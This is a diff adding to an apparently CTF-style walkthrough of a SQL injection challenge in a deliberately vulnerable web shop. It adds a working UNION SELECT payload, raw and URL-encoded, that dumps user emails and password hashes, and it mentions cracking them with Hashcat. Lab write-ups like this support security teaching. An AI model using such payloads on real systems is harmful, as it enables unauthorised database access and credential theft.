@@ -30,7 +30,16 @@ Copy the output from Cyberchef into the repeater request in burpsuite and send i
 
 <img width="1342" height="611" alt="burpsuite3" src="https://github.com/user-attachments/assets/da52dab6-c042-42e6-ab13-16e83f6bf616" />
 
-In the response you can see the JSON array containing all database table names and columns, if you look closely, the table we need is called `Users`.
+In the response you can see the JSON array containing all database table names, if you look closely, the table we need is called `Users`.
+
+The Final Payload should now be like this `GET /rest/products/search?q=apple'))UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--` 
+After URL Encode `GET /rest/products/search?q=apple'))UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--`
+
+<img width="1716" height="1074" alt="credentials" src="https://github.com/user-attachments/assets/6d6a3c64-d7db-4eee-a913-2bff41c88ac4" />
+
+Voilà, we got the User Credentials and solved the Challenge. With `Hashcat` we could now try to crack the password hashes.
+
+
 
 
 
